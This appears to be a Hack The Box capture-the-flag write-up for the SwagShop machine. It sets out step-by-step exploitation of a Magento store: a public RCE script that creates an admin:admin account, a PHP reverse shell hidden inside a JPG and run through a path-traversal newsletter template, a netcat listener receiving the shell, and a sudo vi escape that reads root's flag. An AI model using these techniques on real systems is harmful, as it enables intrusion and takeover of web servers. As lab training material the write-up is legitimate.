@@ -1,0 +1,291 @@
+								 ---------------------------
+								| S W A G   S H O P   B O X |
+								 ---------------------------
+---------------------------------
+	   INFORMATION GATHERING | 
+---------------------------------
+
+Every single time we are going to attack a HTB machine we need to scan our target, so as always we use nmap:
+(I usually run #nmap -sC -sV [target] because is fast and shows enough information, but in case you want to see the whole
+information about the target, or ports that may be open and aren't common you can run #nmap -A [target].
+
+	root@kali:~/Private/Hackthebox/SwagShop# nmap -sC -sV 10.10.10.140
+	Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-08 13:01 UTC
+	Nmap scan report for 10.10.10.140
+	Host is up (0.22s latency).
+	Not shown: 998 closed ports
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+	|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+	|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	|_http-title: Home page
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 31.86 seconds
+
+
+So we couldn't find much information about our target machine, since ssh requieres password and its protected (Secure Shell) we need to find 
+a vunerability on the WebAppService:
+
+Once we go into the web browser we find that "http://10.10.10.140/" is running a Magento Server, so we will need to focus on that to find the main
+directories, vulnerabilities and possible credentials that could be store.
+
+-------------------------------------------
+	   I N F O    M A N A G E M E N T  |
+-------------------------------------------
+
+Magento has an admin login page, which can be found by googling, or by using dirB, or any directory spider... So this can be our entry point to
+exploit the machine.
+
+	root@kali:~/Private/Hackthebox/SwagShop#  searchsploit Magento
+	--------------------------------- ----------------------------------------
+	 Exploit Title                   |  Path
+		                         | (/usr/share/exploitdb/)
+	--------------------------------- ----------------------------------------
+	Magento 1.2 - '/app/code/core/Ma | exploits/php/webapps/32808.txt
+	Magento 1.2 - '/app/code/core/Ma | exploits/php/webapps/32809.txt
+	Magento 1.2 - 'downloader/index. | exploits/php/webapps/32810.txt
+	Magento < 2.0.6 - Arbitrary Unse | exploits/php/webapps/39838.php
+	Magento CE < 1.9.0.1 - (Authenti | exploits/php/webapps/37811.py
+	Magento Server MAGMI Plugin - Mu | exploits/php/webapps/35996.txt
+	Magento Server MAGMI Plugin 0.7. | exploits/php/webapps/35052.txt
+	Magento eCommerce - Local File D | exploits/php/webapps/19793.txt
+  --->  Magento eCommerce - Remote Code  | exploits/xml/webapps/37977.py  <---
+	eBay Magento 1.9.2.1 - PHP FPM X | exploits/php/webapps/38573.txt
+	eBay Magento CE 1.9.2.1 - Unrest | exploits/php/webapps/38651.txt
+	--------------------------------- ----------------------------------------
+	Shellcodes: No Result
+
+
+So we look for some creds vulnerability on searchsploit, metasploit, google... and we find [Magento eCommerce - Remote Code Execution], we can
+see at the bottom of the page that the server is running Magento 2014, so this may be vulnerable to this script, so we download it, configure the
+script data in order to set our machine target and ports.
+
+
+----------------------------------------------------------
+	   E X P L O I T  &  I N F O  M A N A G E M E N T |
+----------------------------------------------------------
+
+	root@kali:~/Private/Hackthebox/SwagShop#  searchsploit -m exploits/xml/webapps/37977.py
+	root@kali:~/Private/Hackthebox/SwagShop#  gedit 37977.py -> Target = "http:/10.10.10.140" , Target_url = target + 
+	"index.php" + "admin/Cms_Wysiwyg/directive/index/"
+	root@kali:~/Private/Hackthebox/SwagShop#  python 37977.py
+
+		WORKED
+		Check http://10.10.10.140/admin with creds admin:admin
+
+
+It worked!! Let's move on to the admin login page and try to log in with our credentials, once we're in we will see the Admin Control Panel.
+
+Now it's time for some googling lookin for Magento's Admin Control Panel vulnerability and we can find an attack which can cause a reverse
+shell by uploading an image.jpg with php code (reverse shell)  into a directory and then via the Newsletter Templates we can preview our image
+as php code, here is the info [https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper] you should take a look, was really interesting
+and well guided.
+
+So the first step we need to do now is download a php reverse shell code [http://pentestmonkey.net/tools/web-shells/php-reverse-shell]
+
+Once we've downloaded it, we need to modify the code and set our target machine and our target port:
+
+	$ip = '127.0.0.1'; //CHANGE THIS --> Your HTB ip
+	$port = 1234;
+
+Now, we need to download some random image and put our code into the image:
+
+	root@kali:~/Private/Hackthebox/SwagShop# cat sock.jpg shell.php > socketimage.jpg
+
+To see if it worked, try to cat the result image, it should look like this: 
+
+						
+
+					      ( .    .    . )						   
+
+						[ JPG CODE ]
+		,
+		�
+		r��Le�%Voll���n��l�P�9�qØk���FB�ق�ѹ-�Aŏ�Bh��&�j�M����AcUUG�=���)�_��
+				                                                    ҙi�����5�q4�ƚ7��e�Q�jEr��m���k�1cU�n�l��&̛�Jմ`���!R��r�7E�d���v��V��{���3�*h���٣�z��NIU^�r9ŏimG��ʆ�&�*����c�����ڬ����+(3Z%G1�ۗn�'��<?php
+		// php-reverse-shell - A Reverse Shell implementation in PHP
+		// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+		//
+		// This tool may be used for legal purposes only.  Users take full responsibility
+
+					      ( .    .    . )						   
+
+						[ PHP CODE ]
+					
+
+
+-------------------------
+	   E X P L O I T |
+-------------------------
+
+Now, its time to configure our server to exploit the vulnerability, to do this we need to go to System > Configuration > Developer, and 
+activate "Allow Symlinks" for Magento Newsletter templates, allowing us as administrator to access newsletter templates outside of the newsletter
+document root.
+
+
+Steps to follow:
+
+   1 - Upload .php code embedded as .jpg file to the target server 
+   2 - Create a template which redirects the execution to our uploaded image
+   3 - Set a listener to open the shell we injected
+
+
+	[ 1 ]
+
+As mentioned before, once we've created the .jpg file with the .php code embedded, we need to go to Newsletter > Newsletter Templates and create a 
+new one, to insert the image we will need to create a New Folder and then include our image.
+
+Once we create the template we need to inspect the code in our message to find the path from our image, in my case:
+	"http://10.10.10.140/media/wysiwyg/rooting/hsmxmxishere.jpg"
+
+If we go to the url from the uploaded image we should see our image run properly, the code won't be executed yet.
+
+
+	[ 2 ]
+
+Now it's time to create the template which will execute our code by previewing the result, so we need to create a template as before with this block:
+	
+	{{block type='core/template' template='../../../../../../*PATH_GOES_HERE*}}
+	{{block type='core/template' template='../../../../../../media/wysiwyg/rooting/hsmxmxishere.jpg'}} --> My Result
+
+Since we previously enabled the "Allow Symlinks" option, Magento won't reject this path and we will be able to view the newsletter by clicking on the
+"Preview Template" option, loading the template and including any template blocks in the preview page including the malicious file and code, 
+interpretending the file as PHP interpreter and not as an image.
+
+
+	[ 3 ]
+
+Before running our preview we need to set up a listener using our reverseshell port which can be done by netcat:
+
+	root@kali:~/Private/Hackthebox/SwagShop# nc -lvp 1234
+	listening on [any] 1234 ...
+
+Now it's time to preview our file and it will open us the shell:
+
+	root@kali:~/Private/Hackthebox/SwagShop# nc -lvp 1234
+	listening on [any] 1234 ...
+	10.10.10.140: inverse host lookup failed: Unknown host
+	connect to [10.10.15.59] from (UNKNOWN) [10.10.10.140] 41682
+	Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+	 06:53:23 up 18 min,  0 users,  load average: 0.36, 0.45, 0.36
+	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	/bin/sh: 0: can't access tty; job control turned off
+	$
+
+
+--------------------------
+       U S E R   F L A G  |
+--------------------------
+
+User flag is already exploited, we just need to find it around our exploited machine:
+
+	root@kali:~/Private/Hackthebox/SwagShop# nc -lvp 1234
+	listening on [any] 1234 ...
+	10.10.10.140: inverse host lookup failed: Unknown host
+	connect to [10.10.15.59] from (UNKNOWN) [10.10.10.140] 39870
+	Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+	 07:54:16 up 7 min,  0 users,  load average: 0.01, 0.04, 0.01
+	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	/bin/sh: 0: can't access tty; job control turned off
+	$ cd homee
+	/bin/sh: 1: cd: can't cd to homee
+	$ cd home
+	$ cd haris
+	$ cat user.txt
+	[ User hash ]
+
+
+
+--------------------------
+       R O O T   F L A G  |
+--------------------------
+
+To find root's flag we need to exploit some kind of privesc in order to read our flag:
+
+	$: sudo -l
+	Matching Defaults entries for www-data on swagshop:
+	env_reset, mail_badpass,
+	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+	User www-data may run the following commands on swagshop:
+	(root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+It seems that we can use vi as root privilege without any password, so we can exploit this vuln to get the privesc we need:
+
+	$ sudo /usr/bin/vi /var/www/html/test.sh 
+	Vim: Warning: Output is not to a terminal
+	Vim: Warning: Input is not from a terminal
+--->    :!cat /root/root.txt  <--- [We inject the code here while the file is been created exploiting the execution]
+
+	E558: Terminal entry not found in terminfo
+	'unknown' not known. Available builtin terminals are:
+	    builtin_amiga
+	    builtin_beos-ansi
+	    builtin_ansi
+	    builtin_pcansi
+	    builtin_win32
+	    builtin_vt320
+	    builtin_vt52
+	    builtin_xterm
+	    builtin_iris-ansi
+	    builtin_debug
+	    builtin_dumb
+	defaulting to 'ansi'
+
+
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~
+	~/var/www/html/test.sh" 0L, 0C
+	~
+	~
+	~
+	~
+	:!cat /root/root.txt
+	[ Root Hash ]
+
+	   ___ ___
+	 /| |/|\| |\
+	/_| ´ |.` |_\           We are open! (Almost)
+	  |   |.  |
+	  |   |.  |         Join the beta HTB Swag Store!
+	  |___|.__|       https://hackthebox.store/password
+
+		           PS: Use root flag as password!
+
+
+
+-----------------
+CONGRATULATIONS! |
+-----------------
+
+
+     __   __   _______   ______   __    __  ________   _______
+    |  |_|  | |   _   | |  ____| |  |  / / | _______| |  ____ )
+    |       | |  |_|  | | |      |  |_/ /  | |_____   | |    ) )
+    |   _   | |   _   | | |____  |      \  | |______  | |____) )
+    |__| |__| |__| |__| |______| |__/\___\ |________| |_______)
+ 
+
+
+
